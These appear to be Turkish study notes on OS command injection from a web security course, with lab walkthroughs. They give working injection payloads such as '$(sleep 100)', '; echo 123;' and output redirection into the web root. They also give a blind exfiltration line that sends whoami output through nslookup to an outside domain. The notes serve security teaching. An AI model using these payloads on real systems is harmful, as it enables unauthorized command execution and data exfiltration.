<h1 align="center">OS Command Injection</h1>

- Günümüz web uygulamalarının istisnasız, OS ile bir iletişimi vardır ve buna da ihtiyacı vardır. Bu uygulamanın belli durumlarda işletim sistemindeki diğer programlarla da etkileşime geçmesi gerekmektedir.
- Bir web sitesi bir işi 60sn içerisinde tamamlayamıyor ise, background job iş olarak yapma eğilimindedir.
- 60sn yi geçerse, alttaki TCP session’ı kopabilir tabi gönderilen header’ın connection-type ına göre belirleniyor bu.
- Burdaki web uygulaması yapacağı işin belli birtakım şartlarının olması gerekli:
    1. Req-response döngüsü içinde cevap üretemeyeceğin kadar yoğun  bir işin varsa. Bu işi, kullanıcıdan alıp background job başlatıp schedule ediyor, işim bitince ben sana mail atarım diyor. Bu iş için OS ile iletişim kurabilmesi için arkada belli başlı kodların yazılması gerekiyor.
- Bir HTTP req-response cycle içerisinde bitmeyen ama işletim sisteminin arkada yapmaya devam ettiği işlere asenkron proccessler denir.
#### İşletim Sistemi üzerinde komut çalıştırmaya ihtiyaç duyulan her noktada bir Command Line Injection bulunabilir.
- Kullanıcıdan bir parametre alırsan, bu parametreyi güvensiz bir şekilde koyarsan Command Injection olur. Alınan input kullanılan yer :
    - Output, HTML içeriğinde ise ve encoding yapmıyor ise XSS,
    - SQL sorgusunda kullanılıyorsa ve parameter bining yapmıyorsa SQLi,
    - İşletim sisteminde çalışacak komutun bir parçasında güvenli bir şekilde yer almıyorsa OS Command Injection.
#### PHP dilinde ` işareti, komut satırında komut çalıştırıyor.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/5f0e3632-60e4-4886-b581-b3eaafa037e6)
- "; ile kodu durdurup geri kalanında istediğini yazabilirsin
```sh
sleep 100; 
	komutu mesela
```
## Linux Tips
```sh
echo BENIM ADIM "MEHMET $(sleep 100) INCE"
```
- buradaki olay aslında çift tırnak olması
	- Linux işletim sistemi çift tırnak içerisinde $() işareti içinde mevzu gördüğünde string interpolation gerçekleştiriyor
	- Ortadaki komutun çıktısı tırnakların içine string olarak gidiyor
- " ve ; gibi işaretler input validationa takılır genellikle.
#### " ile kapatıp istedğin kodu yazabilirsin ama işte engele takılır.
- Windowsta da Powershell'i kontrol edebiliyorsan orda da yarar bu
#### Tek tırnak kullanmak gerekiyor ama yine tek tırnak kapatıp istediğin kodu enjekte edebilirsin.
### Nihai payload kodu şu şekilde:
```sh
’$(sleep 100)’
```
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/4e505be6-5460-42ea-9e38-c6cad79be5d7)

- Çalıştırdığın komutun çıktısını HTML içeriğinde görebiliyorsan sıkıntı yok.
- Asenkron yapılarda ise, Blind OS Command Injection gerçekleşir. Bunun için en güzel yöntem “nslookup” tır. Hem windowsta hem linuxta ortak komuttur.
    - nslookup google.com
    - Bu komut çalıştırıldığında sistemdeki default name server ne ise ona gider. Oradan root DNS’e gider, sonrasında senin dns sunucuna gelir ve loglarında görmeye başlarsın.
    - echo BENIM ADIM ‘MEHMET ‘$(nslookup $(whoami).mehmetince.net)’ INCE’
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/a40e07ea-597d-4aee-9a09-0200c210a831)
- whoami içinde boşluk, değişik karakterler falan olmamalı. Domain, RFC protokolüne uygun bir şeyler olması lazım.
## Lab: OS Command Injection, Simple Case
- Burp suite ile bir ürün sorgusunun trafiğini yakalıyoruz.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/17386aed-a9d3-4128-8723-719a8d888225)
- Stok kontrolü isteği gelince, sunucu arka taraftaki stok kontrolü ile ilgili servise gidiyor yani komut satırında komut çalıştırıyor.
- Çıktı olarak sunucu integer bir değer bekliyor o yüzden whoami çalışmadı ama sleep 10 komutu çalıştı. Tırnak koymadan yaptı
- tek tırnak “ veya ‘ koyunca Syntax hatası veriyorsa, arka tarafa parametreler yalın halde gidiyor demektir: checkstock.sh 1 2
- “” şeklindeyse, ‘ konulduğunda syntax hatası vermemesi lazım.
- ‘’ şeklindeyse, “ konulduğunda hata vermemesi lazım.
- ; echo 123; yaptığında çıktı verdi
    - [checkstock.sh](http://checkstock.sh) 1 $(whoami) yapmak yerine yani parametreye yazmak yerine,
    - proccessin outputuna veriyi koymak gerekiyor yani, std.output’a gelen data bu diyecek adam
    - pipe atıp | echo $(whoami) yapabilirsin
## Lab: Blind OS Command Injection with time delays
- Feedback verme kısmında senin formu save ediyor arka tarafa.
    - Tek tırnak ‘ atınca save etti, çift tırnak “ atınca save edemedi
    - Demek oluyor ki, arka taraftaki komut çift tırnaklar “ arasına alınmış.
    - $(sleep 10)
## Lab: Blind OS Command Injection with output redirection
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/1cf17982-7bde-4c3e-8b15-0561b74d3cec)
- Zaafiyet BLIND ise, kendi komutunun çıktısı yansımıyor fakat SLEEP ile zaafiyeti doğrulayabilirsin.
- Kendi komutunun çıktısını bir pathe redirection yaparsan ve o path’e de web üstünden erişebiliyor isen böylece Command Injectionu zaafiyetini sömürebilirsin.
- inputların hangisini kontrol ettiğimizi bilmiyoruz
- gidip en sona :
    - $(whoami%20>%20/var/www/images/mdisec.txt)
    - $(whoami%20>%20/var/www/images/mdisec.txt)
    - Sayfanın kaynak kodlarında .jpeg, .png gibi dosyalara bakıp seninki de orada mı diye kontrol edebilirsin.
    - payloadı yazdıktan sonra ana sayfadaki fotoğrafları yükleme URL’i üstünden GET isteğinden filename=mdisec.txt yaptığında çözülür.
    - Endpoint üstünden yüklendiği için böyle tasarlanmış lab. Fullpath verip de görebilirsin gerçek hayatta.
